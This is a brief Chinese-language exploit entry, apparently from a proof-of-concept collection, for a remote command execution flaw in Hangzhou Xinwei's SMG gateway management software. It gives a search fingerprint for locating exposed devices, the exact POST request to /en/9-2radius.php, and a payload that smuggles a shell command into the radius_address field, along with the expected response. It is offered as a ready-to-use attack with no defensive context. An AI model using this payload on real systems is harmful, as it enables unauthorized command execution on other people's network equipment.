# 杭州新威数字信息-SMG网关管理软件_9-2radius存在远程命令执行

杭州新威数字信息-SMG网关管理软件_9-2radius ｜ 命令执行 ｜ —
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /en/9-2radius.php?authority=6 HTTP/1.1`

**Payload**
```
save=1&enable_radius=1&radius_address=/';id;+#+
```
- **响应特征**：200